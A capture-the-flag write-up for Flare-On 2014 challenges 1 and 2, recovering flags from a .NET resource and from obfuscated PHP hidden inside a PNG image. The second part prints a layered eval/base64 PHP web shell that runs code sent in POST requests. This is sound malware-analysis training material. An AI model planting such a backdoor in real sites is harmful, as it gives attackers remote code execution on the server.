# Flare-On 1 (2014)

## Sources

You can download the relevant files on this page: <https://github.com/fareedfauzi/Flare-On-Challenges/tree/master/Challenges/2014/Flare-on%201>.

### Challenge 01

Hashes of the archive (`C1.zip`) containing the files of the challenge:

Hash | Value
-|-
MD5 | 7094c69959f626f8078145ab75abbbd0
SHA1 | 0e5895e65fe0f50275047bfb033ed272728ad4eb
SHA256 | 038e9ad33a0529337b0b0c30e37ae92787d0f0fb784e4c41cf2f36b020a5542e

Once you extract from the *Win32 Cabinet Self-Extractor* (`C1.exe`), you'll find yourself with a Windows executable written in `.NET`.

Opening the binary with `dnSpy`, I noticed the following function:

```cs
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
```

As you may infer from this code, the function is applied to a button of a GUI program. When the user clicks on the button, this function `btnDecode_Click` is executed.

The most interesting part of the code is the following:

```cs
byte[] dat_secret = Resources.dat_secret;
string text = "";

foreach (byte b in dat_secret)
{
    text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
}
```

It seems to retrieve a resource (from the `.rsrc` section) and then performs some bitwise operations on each byte of the resource data.

There are two ways to get the flag for this challenge:

- debugging the application (put a breakpoint at the beginning of the function `btnDecode_Click` and start the application)
- writing a small script to decode the value

I used the first approach, since it's easier and faster. The flag should be the following: `3rmahg3rd.b0b.d0ge@flare-on.com`.

However, I also wanted to test whether I could decode it manually. To retrieve the resource, you can use `dnSpy`:

- go to `Resources`
- right-click on *rev_challenge_1.dat_secret.encode*
- select *Show in Hex editor*
- *Ctr-C* to copy the hex bytes

```py
encoded = "A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444"
encoded_bytes = bytearray.fromhex(encoded)

decoded_list = [chr((b >> 4 | (b << 4 & 240)) ^ 41) for b in encoded_bytes]
print("".join(decoded_list))
# 3rmahg3rd.b0b.d0ge@flare-on.com
```

I successfully managed to decode it manually!

### Challenge 02

Hashes of the archive (`C2.zip`) containing the files of the challenge:

Hash | Value
-|-
MD5 | 74ea6bd7a2e19cfd6096614d7d9e8e0f
SHA1 | 32b08a345a4246526e8ecd73cacb8ceef3c32e9e
SHA256 | 407c11647b9c58f41daba5a6b85f04ac2a0c31bab9eefe3362c2805329a59bd1

I had some problems extracting the files from the archive `C2.zip`, due the `unzip` not supporting the compression algorithm *PK 5.1*. In the end, I managed to extract it this way:

```bash
# password: malware
7x x C2.zip -ochall_02
```

Inside, there are two files:

```txt
.
├── home.html
└── img
    └── flare-on.png
```

While the HTML file doesn't contain anything useful, the image `flare-on.png` contains some PHP code, while still being a valid image!

If you were to run `strings` on the latter, you would find this code:

```php
<?php

$terms = array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");

$order = array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);

$do_me = "";
for ($i = 0; $i < count($order); $i++)
{
    $do_me = $do_me.$terms[$order[$i]];
}

eval($do_me);
?>
```

To de-obfuscate the code, I simply replaced the `eval` function with an `echo`:

```php
$_ = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";

eval($___($__));
```

This one is a little more complicated. First, the variable `$___` is the string `base64_decode` encoded to hex/decimal notation.

Once again, replacing `eval` with `echo` reveals the next block of code:

```php
$code = base64_decode($_);
eval($code);
```

Once more:

```php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]))
{
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}
```

To decode the two strings, I used some python code:

```py
l = [97, 49, 49, 68, 0x4F, 84, 116, 0x68, 97, 0x74, 0x44, 0x4F, 0x54, 0x6A, 97, 0x76, 0x61, 0x35, 0x63, 0x72, 97, 0x70, 0x41, 84, 0x66, 0x6C, 97, 0x72, 0x65, 0x44, 65, 0x53, 72, 111, 110, 68, 79, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in l])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom

m = [97, 49, 0x31, 68, 0x4F, 0x54, 116, 104, 0x61, 116, 0x44, 79, 0x54, 106, 97, 118, 97, 53, 0x63, 114, 0x61, 0x70, 65, 84, 102, 0x6C, 0x61, 114, 101, 0x44, 65, 0x53, 72, 111, 0x6E, 0x44, 0x4F, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in m])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

In both cases, the resulting decoded string is *a11DOTthatDOTjava5crapATflareDASHonDOTcom*, so the flag should be the following:

```txt
a11.that.java5crap@flare-on.com
```

### Challenge 03

### Challenge 04

### Challenge 05

### Challenge 06

### Challenge 07
